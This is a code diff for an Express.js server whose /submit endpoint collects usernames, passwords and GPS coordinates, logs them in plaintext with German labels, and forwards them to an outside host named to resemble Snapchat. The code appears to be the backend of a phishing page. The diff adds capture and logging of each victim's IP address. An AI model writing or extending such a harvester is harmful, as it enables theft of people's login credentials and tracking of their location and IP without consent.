@@ -14,9 +14,11 @@ app.use(express.json());
 app.post('/submit', async (req, res) => {
   try {
     const { username, password, latitude, longitude } = req.body;
-
+    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
     const logData = {
       timestamp: new Date().toISOString(),
+      ip: clientIp,
       userAgent: req.headers['user-agent'],
       username,
       password,
@@ -31,6 +33,7 @@ app.post('/submit', async (req, res) => {
     console.log("👤 Benutzername:", username);
     console.log("🔑 Passwort:", password);
     console.log("📍 Standort:", latitude, longitude);
+    console.log("📍 IP:", clientIp);
 
     await fetch('https://snapchat-35f2.onrender.com/submit', {
       method: 'POST',
